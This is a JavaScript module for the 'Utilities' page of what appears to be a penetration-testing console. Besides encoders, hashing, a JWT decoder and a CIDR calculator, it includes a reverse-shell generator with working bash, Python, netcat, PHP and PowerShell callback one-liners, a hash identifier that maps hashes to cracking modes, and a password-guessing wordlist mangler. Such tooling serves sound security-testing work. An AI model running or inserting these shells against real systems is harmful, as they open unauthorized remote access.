// Interactive in-browser utilities for the Sentinel console. Everything here
// runs client-side — nothing is sent anywhere.
const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) =>
  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
const enc = new TextEncoder();

function copyBtnWire(root) {
  root.addEventListener("click", (e) => {
    const b = e.target.closest("[data-copytarget]"); if (!b) return;
    const t = root.querySelector("#" + b.dataset.copytarget); if (!t) return;
    navigator.clipboard?.writeText(t.value ?? t.textContent).then(() => { const o = b.textContent; b.textContent = "copied"; setTimeout(() => (b.textContent = o), 1000); });
  });
}

// ---- individual utilities ----
async function sha(algo, s) { const b = await crypto.subtle.digest(algo, enc.encode(s)); return [...new Uint8Array(b)].map((x) => x.toString(16).padStart(2, "0")).join(""); }

function idHash(h) {
  h = h.trim();
  if (/^\$2[aby]\$/.test(h)) return "bcrypt";
  if (/^\$6\$/.test(h)) return "sha512crypt";
  if (/^\$1\$/.test(h)) return "md5crypt";
  if (/^[a-f0-9]{32}$/i.test(h)) return "MD5 or NTLM (hashcat -m 0 / -m 1000)";
  if (/^[a-f0-9]{40}$/i.test(h)) return "SHA-1 (-m 100)";
  if (/^[a-f0-9]{64}$/i.test(h)) return "SHA-256 (-m 1400)";
  if (/^[a-f0-9]{128}$/i.test(h)) return "SHA-512 (-m 1700)";
  if (/^[a-f0-9]{16}$/i.test(h)) return "MySQL<4.1 / crc";
  return "unknown — check length/charset";
}
function pwEntropy(p) {
  if (!p) return { bits: 0, label: "—" };
  let pool = 0;
  if (/[a-z]/.test(p)) pool += 26;
  if (/[A-Z]/.test(p)) pool += 26;
  if (/[0-9]/.test(p)) pool += 10;
  if (/[^a-zA-Z0-9]/.test(p)) pool += 33;
  const bits = Math.round(p.length * Math.log2(pool || 1));
  const label = bits < 40 ? "weak" : bits < 60 ? "fair" : bits < 80 ? "strong" : "very strong";
  return { bits, label };
}
function uuid4() {
  const b = crypto.getRandomValues(new Uint8Array(16));
  b[6] = (b[6] & 0x0f) | 0x40; b[8] = (b[8] & 0x3f) | 0x80;
  const h = [...b].map((x) => x.toString(16).padStart(2, "0")).join("");
  return `${h.slice(0, 8)}-${h.slice(8, 12)}-${h.slice(12, 16)}-${h.slice(16, 20)}-${h.slice(20)}`;
}
function genPw(len, sym) {
  const base = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const chars = base + (sym ? "!@#$%^&*()-_=+[]{};:,.<>?" : "");
  const a = crypto.getRandomValues(new Uint32Array(len));
  return [...a].map((n) => chars[n % chars.length]).join("");
}
function revshell(lang, ip, port) {
  ip = ip || "10.0.0.1"; port = port || "4444";
  const L = {
    bash: `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
    "python3": `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/sh")'`,
    nc: `nc -e /bin/sh ${ip} ${port}`,
    "nc-mkfifo": `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
    php: `php -r '$s=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    powershell: `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}"`,
  };
  return L[lang] || L.bash;
}

function cidrCalc(input) {
  const m = String(input).trim().match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
  if (!m) return null;
  const ip = m[1].split(".").map(Number), bits = +m[2];
  if (ip.some((o) => o > 255) || bits > 32) return null;
  const ipn = (((ip[0] << 24) >>> 0) + (ip[1] << 16) + (ip[2] << 8) + ip[3]) >>> 0;
  const mask = bits === 0 ? 0 : (0xffffffff << (32 - bits)) >>> 0;
  const net = (ipn & mask) >>> 0, bc = (net | (~mask >>> 0)) >>> 0;
  const toIp = (n) => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join(".");
  const hosts = bits >= 31 ? (bits === 32 ? 1 : 2) : (bc - net - 1);
  return { network: toIp(net), broadcast: toIp(bc), netmask: toIp(mask), first: toIp(bits >= 31 ? net : net + 1), last: toIp(bits >= 31 ? bc : bc - 1), hosts };
}
function mangle(text) {
  const out = new Set(), suff = ["", "1", "123", "!", "@", "2024", "2025", "01", "007"];
  const leet = (w) => w.replace(/a/gi, "4").replace(/e/gi, "3").replace(/i/gi, "1").replace(/o/gi, "0").replace(/s/gi, "$");
  text.split(/\r?\n/).map((w) => w.trim()).filter(Boolean).forEach((w) => {
    const caps = new Set([w.toLowerCase(), w.toUpperCase(), w[0].toUpperCase() + w.slice(1).toLowerCase()]);
    caps.forEach((c) => { suff.forEach((s) => { out.add(c + s); out.add(c + s + "!"); }); out.add(leet(c)); });
  });
  return [...out].slice(0, 2000);
}

// ---- render ----
export function renderUtils(main) {
  main.innerHTML = `
    <h1 class="pg-h1">Utilities</h1>
    <p class="muted pg-sub">Interactive tools that run right here in your browser &mdash; nothing leaves this page.</p>
    <div class="util-grid" id="ug"></div>`;
  const ug = main.querySelector("#ug");

  const card = (title, tag, body) => `<div class="util-card"><div class="util-head"><h3>${esc(title)}</h3><span class="chip">${esc(tag)}</span></div>${body}</div>`;
  ug.innerHTML = [
    card("Base64", "Encode", `<textarea class="in" id="b64in" rows="2" placeholder="text or base64"></textarea>
      <div class="util-btns"><button class="btn sm" data-a="b64e">Encode</button><button class="btn ghost sm" data-a="b64d">Decode</button><button class="btn ghost sm" data-copytarget="b64out">copy</button></div>
      <textarea class="in mono" id="b64out" rows="2" readonly></textarea>`),
    card("URL", "Encode", `<textarea class="in" id="urlin" rows="2" placeholder="text or %XX"></textarea>
      <div class="util-btns"><button class="btn sm" data-a="urle">Encode</button><button class="btn ghost sm" data-a="urld">Decode</button><button class="btn ghost sm" data-copytarget="urlout">copy</button></div>
      <textarea class="in mono" id="urlout" rows="2" readonly></textarea>`),
    card("Hex", "Convert", `<textarea class="in" id="hexin" rows="2" placeholder="text or hex"></textarea>
      <div class="util-btns"><button class="btn sm" data-a="hexe">Text → Hex</button><button class="btn ghost sm" data-a="hexd">Hex → Text</button><button class="btn ghost sm" data-copytarget="hexout">copy</button></div>
      <textarea class="in mono" id="hexout" rows="2" readonly></textarea>`),
    card("Hashes", "SHA", `<textarea class="in" id="hin" rows="2" placeholder="text to hash (updates live)"></textarea>
      <div class="util-kv"><span>SHA-1</span><code id="h1" class="util-val"></code></div>
      <div class="util-kv"><span>SHA-256</span><code id="h256" class="util-val"></code></div>
      <div class="util-kv"><span>SHA-512</span><code id="h512" class="util-val"></code></div>`),
    card("JWT decoder", "Decode", `<textarea class="in" id="jwtin" rows="2" placeholder="paste a JWT (eyJ...)"></textarea>
      <pre class="out" id="jwtout" style="margin-top:8px">header + payload appear here</pre>`),
    card("Reverse shell", "Generate", `<div class="util-row"><input class="in mono" id="rsip" value="10.0.0.1" placeholder="LHOST"><input class="in mono" id="rsport" value="4444" placeholder="LPORT" style="max-width:90px">
      <select class="in" id="rslang">${["bash", "python3", "nc", "nc-mkfifo", "php", "powershell"].map((l) => `<option>${l}</option>`).join("")}</select></div>
      <div class="util-btns"><button class="btn ghost sm" data-copytarget="rsout">copy</button></div>
      <textarea class="in mono" id="rsout" rows="2" readonly></textarea>`),
    card("Hash identifier", "Identify", `<input class="in mono" id="hidin" placeholder="paste a hash">
      <div class="util-kv"><span>Likely</span><code id="hidout" class="util-val">—</code></div>`),
    card("Timestamp", "Convert", `<div class="util-row"><input class="in mono" id="tsin" placeholder="epoch seconds or ms"><button class="btn sm" data-a="tsnow">Now</button></div>
      <div class="util-kv"><span>UTC</span><code id="tsutc" class="util-val">—</code></div>
      <div class="util-kv"><span>Local</span><code id="tslocal" class="util-val">—</code></div>`),
    card("Generators", "Random", `<div class="util-btns"><button class="btn sm" data-a="uuid">UUID v4</button><button class="btn sm" data-a="pw">Password</button><label class="util-chk"><input type="checkbox" id="pwsym" checked> symbols</label><button class="btn ghost sm" data-copytarget="genout">copy</button></div>
      <input class="in mono" id="genout" readonly placeholder="click a generator">`),
    card("CIDR calculator", "Network", `<input class="in mono" id="cidrin" placeholder="192.168.1.0/24">
      <div class="util-kv"><span>Network</span><code id="cnet" class="util-val">—</code></div>
      <div class="util-kv"><span>Broadcast</span><code id="cbc" class="util-val">—</code></div>
      <div class="util-kv"><span>Netmask</span><code id="cmask" class="util-val">—</code></div>
      <div class="util-kv"><span>Usable</span><code id="crange" class="util-val">—</code></div>
      <div class="util-kv"><span>Hosts</span><code id="chosts" class="util-val">—</code></div>`),
    card("Password strength", "Analyze", `<input class="in mono" id="pwin" placeholder="type a password (stays in this page)">
      <div class="util-kv"><span>Entropy</span><code id="pwbits" class="util-val">—</code></div>
      <div class="pw-meter"><span id="pwbar"></span></div>`),
    card("Wordlist mangler", "Generate", `<textarea class="in" id="mangin" rows="2" placeholder="base words, one per line (name, company...)"></textarea>
      <div class="util-btns"><button class="btn sm" data-a="mangle">Generate</button><button class="btn ghost sm" data-copytarget="mangout">copy</button></div>
      <textarea class="in mono" id="mangout" rows="4" readonly></textarea>`),
  ].join("");

  const $ = (id) => main.querySelector("#" + id);
  const b64e = (s) => btoa(unescape(encodeURIComponent(s)));
  const b64d = (s) => decodeURIComponent(escape(atob(s.trim())));

  // live hashes
  const hashUpdate = async () => {
    const v = $("hin").value;
    if (!v) { $("h1").textContent = $("h256").textContent = $("h512").textContent = ""; return; }
    $("h1").textContent = await sha("SHA-1", v);
    $("h256").textContent = await sha("SHA-256", v);
    $("h512").textContent = await sha("SHA-512", v);
  };
  $("hin").oninput = hashUpdate;
  $("jwtin").oninput = () => {
    const p = $("jwtin").value.trim().split(".");
    if (p.length < 2) { $("jwtout").textContent = "header + payload appear here"; return; }
    try {
      const dec = (x) => JSON.stringify(JSON.parse(b64d(x.replace(/-/g, "+").replace(/_/g, "/"))), null, 2);
      $("jwtout").textContent = "// header\n" + dec(p[0]) + "\n\n// payload\n" + dec(p[1]);
    } catch (e) { $("jwtout").textContent = "Invalid JWT: " + e.message; }
  };
  const rsUpdate = () => { $("rsout").value = revshell($("rslang").value, $("rsip").value, $("rsport").value); };
  ["rsip", "rsport"].forEach((id) => ($(id).oninput = rsUpdate));
  $("rslang").onchange = rsUpdate; rsUpdate();
  $("hidin").oninput = () => { $("hidout").textContent = $("hidin").value ? idHash($("hidin").value) : "—"; };
  const tsUpdate = () => {
    const raw = $("tsin").value.trim(); if (!raw || isNaN(raw)) { $("tsutc").textContent = $("tslocal").textContent = "—"; return; }
    let n = Number(raw); if (raw.length <= 11) n *= 1000;
    const d = new Date(n); $("tsutc").textContent = d.toUTCString(); $("tslocal").textContent = d.toLocaleString();
  };
  $("tsin").oninput = tsUpdate;
  $("cidrin").oninput = () => {
    const r = cidrCalc($("cidrin").value);
    if (!r) { ["cnet", "cbc", "cmask", "crange", "chosts"].forEach((i) => ($(i).textContent = "—")); return; }
    $("cnet").textContent = r.network; $("cbc").textContent = r.broadcast; $("cmask").textContent = r.netmask;
    $("crange").textContent = r.first + " – " + r.last; $("chosts").textContent = r.hosts.toLocaleString();
  };
  $("pwin").oninput = () => {
    const e = pwEntropy($("pwin").value); $("pwbits").textContent = $("pwin").value ? e.bits + " bits · " + e.label : "—";
    const bar = $("pwbar"); bar.style.width = Math.min(100, e.bits) + "%"; bar.dataset.lvl = e.label.replace(" ", "-");
  };

  ug.onclick = (e) => {
    const b = e.target.closest("[data-a]"); if (!b) return;
    const a = b.dataset.a;
    try {
      if (a === "b64e") $("b64out").value = b64e($("b64in").value);
      else if (a === "b64d") $("b64out").value = b64d($("b64in").value);
      else if (a === "urle") $("urlout").value = encodeURIComponent($("urlin").value);
      else if (a === "urld") $("urlout").value = decodeURIComponent($("urlin").value);
      else if (a === "hexe") $("hexout").value = [...enc.encode($("hexin").value)].map((x) => x.toString(16).padStart(2, "0")).join("");
      else if (a === "hexd") $("hexout").value = new TextDecoder().decode(new Uint8Array($("hexin").value.trim().replace(/\s+/g, "").match(/.{1,2}/g).map((h) => parseInt(h, 16))));
      else if (a === "tsnow") { $("tsin").value = Date.now(); tsUpdate(); }
      else if (a === "uuid") $("genout").value = uuid4();
      else if (a === "pw") $("genout").value = genPw(20, $("pwsym").checked);
      else if (a === "mangle") $("mangout").value = mangle($("mangin").value).join("\n");
    } catch (err) {
      const outMap = { b64e: "b64out", b64d: "b64out", urle: "urlout", urld: "urlout", hexe: "hexout", hexd: "hexout" };
      if (outMap[a]) $(outMap[a]).value = "Error: " + err.message;
    }
  };
  copyBtnWire(main);
}
